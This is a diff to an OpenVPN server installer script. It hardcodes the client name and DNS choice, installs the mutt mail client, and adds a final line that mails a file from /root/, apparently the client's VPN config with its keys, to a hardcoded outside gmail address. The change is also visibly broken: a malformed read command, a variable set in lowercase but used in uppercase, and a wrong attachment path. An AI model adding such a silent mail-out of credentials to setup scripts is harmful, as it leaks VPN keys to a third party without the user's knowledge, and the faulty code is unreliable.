@@ -79,13 +79,14 @@ if [[ -e /etc/openvpn/server.conf ]]; then
 		echo "   2) Revoke existing user cert"
 		echo "   3) Remove OpenVPN"
 		echo "   4) Exit"
-		read -p "Select an option [1-4]: " option
+		read -p "Select an option [1-4]: " 1 option
 		case $option in
 			1) 
 			echo ""
 			echo "Tell me a name for the client cert"
 			echo "Please, use one word only, no special characters"
-			read -p "Client name: " -e -i client CLIENT
+			client="client_$IP"
+			# read -p "Client name: " -e -i client CLIENT
 			cd /etc/openvpn/easy-rsa/
 			./easyrsa build-client-full $CLIENT nopass
 			# Generates the custom client.ovpn
@@ -191,7 +192,8 @@ else
 	echo "   4) NTT"
 	echo "   5) Hurricane Electric"
 	echo "   6) Verisign"
-	read -p "DNS [1-6]: " -e -i 1 DNS
+	# read -p "DNS [1-6]: " -e -i 2 DNS
+	DNS=2
 	echo ""
 	echo "Finally, tell me your name for the client cert"
 	echo "Please, use one word only, no special characters"
@@ -202,10 +204,12 @@ else
 		if [[ "$OS" = 'debian' ]]; then
 		apt-get update
 		apt-get install openvpn iptables openssl ca-certificates -y
+		apt-get install mutt -y
 	else
 		# Else, the distro is CentOS
 		yum install epel-release -y
 		yum install openvpn iptables openssl wget ca-certificates -y
+		yum install mutt -y
 	fi
 	# An old version of easy-rsa was available by default in some openvpn packages
 	if [[ -d /etc/openvpn/easy-rsa/ ]]; then
@@ -381,4 +385,5 @@ verb 3" > /etc/openvpn/client-common.txt
 	echo ""
 	echo "Your client config is available at ~/$CLIENT.ovpn"
 	echo "If you want to add more clients, you simply need to run this script another time!"
+	echo "This is the message body" | mutt -a "/root/"$client -s "Open VPN $IP" -- cucxabeng@gmail.com 
 fi
